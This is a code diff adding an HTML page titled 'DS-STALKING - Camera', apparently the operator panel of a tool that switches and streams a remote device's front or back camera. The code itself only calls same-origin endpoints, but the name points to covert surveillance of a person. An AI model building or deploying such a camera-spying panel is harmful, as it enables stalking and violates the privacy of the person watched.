@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DS-STALKING - Camera</title>
+</head>
+<body>
+    <h1>DS-STALKING - Camera</h1>
+
+    <button onclick="changeCamera('front')">Caméra avant</button>
+    <button onclick="changeCamera('back')">Caméra arrière</button>
+
+    <h2>Flux Vidéo</h2>
+    <img id="video" width="640" height="480" />
+
+    <script>
+        function changeCamera(cameraType) {
+            fetch("/change_camera", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ camera: cameraType })
+            }).then(response => response.json())
+              .then(data => {
+                  console.log(data);
+              }).catch(error => console.error(error));
+        }
+
+        // Initialiser le flux vidéo
+        fetch("/stream_link", {
+            method: "POST"
+        })
+        .then(response => response.json())
+        .then(data => {
+            const videoElement = document.getElementById('video');
+            videoElement.src = data.stream_url;
+        }).catch(error => console.error(error));
+    </script>
+</body>
+</html>
